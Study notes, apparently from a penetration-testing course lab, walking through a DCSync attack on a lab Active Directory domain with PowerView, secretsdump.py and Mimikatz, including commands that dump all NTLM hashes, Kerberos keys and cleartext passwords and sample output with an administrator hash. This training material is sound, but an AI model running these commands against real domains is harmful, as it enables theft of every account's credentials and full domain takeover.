- [[#What is DCSync and How Does it Work?]]
- [[#Using PowerView]]
    - [[#View Get-DomainUser of adunn's Group Membership]]
    - [[#Using Get-ObjectAcl to Check adunn's Replication Rights]]
- [[#Performing the DCSync]]
    - [[#Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py]]
        - [[#Alternative Flags]]
        - [[#Listing Hashes, Kerberos Keys, and Cleartext Passwords]]
    - [[#Enumerating Further using Get-ADUser]]
    - [[#Checking for Reversible Encryption Option using Get-DomainUser]]
        - [[#Displaying the Decrypted Password]]
- [[#Using Mimikatz for DCsync]]
    - [[#Using runas.exe]]
    - [[#Performing the Attack with Mimikatz]]

> [!important] Based on our work in the previous section, we now have control over the user `adunn` who has DCSync privileges in the INLANEFREIGHT.LOCAL domain. Let's dig deeper into this attack and go through examples of leveraging it for full domain compromise from both a Linux and a Windows attack host.

# **What is DCSync and How Does it Work?**

> [!important]
> 
> - A technique for stealing Active Directory Password Database
> - using the built-in `Directory Replication Service Remote Protocol`
> - Allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes

> [!important] To perform this attack, you must have control over an account that has the rights to perform domain replication
> 
> ==A User with the following:==
> 
> 1. ==Replicating Directory Changes==
> 2. ==Replicating Directory Changes All permissions set==
> 
> Domain/Enterprise Admins and default domain administrators have this right by default.

# Using PowerView

```Bash
cd C:\Tools\

Import-Module .\PowerView.ps1
```

## **View** ==**Get-DomainUser**== **of adunn's Group Membership**

```Bash
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

![[Notion/CPTS/RESOURCES/image 25.png|image 25.png]]

## **Using** ==**Get-ObjectAcl**== **to Check adunn's Replication Rights**

```Bash
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"

Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

![[image 1 17.png|image 1 17.png]]

---

# Performing the DCSync

## **Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py**

> [!important] Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file

```Bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```

### Alternative Flags

1. `-just-dc-ntlm` flag if we only want NTLM hashes
2. `-just-dc-user <USERNAME>` to only extract data for a specific user
3. `-pwd-last-set` to see when each account's password was last changed
4. `history` if we want to dump password history
5. `-user-status` is another helpful flag to check and see if a user is disabled

### **Listing Hashes, Kerberos Keys, and Cleartext Passwords**

```Bash
ls inlanefreight_hashes*
```

## **Enumerating Further using Get-ADUser**

```Bash
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

## **Checking for Reversible Encryption Option using Get-DomainUser**

```Bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

We will notice the tool decrypted the password and provided us with the cleartext value.

### **Displaying the Decrypted Password**

```Bash
cat inlanefreight_hashes.ntds.cleartext
```

---

# Using Mimikatz for DCsync

> [!important] We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the `krbtgt` account and use this to create a `Golden Ticket` for persistence, but that is outside the scope of this module.
> 
> Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize `runas.exe` to accomplish this:

## **Using runas.exe**

```Bash
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

- From the newly spawned powershell session, we can perform the attack:

## **Performing the Attack with Mimikatz**

```Bash
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4625fd0c31368ff4c255a3b876eaac3d

<SNIP>
```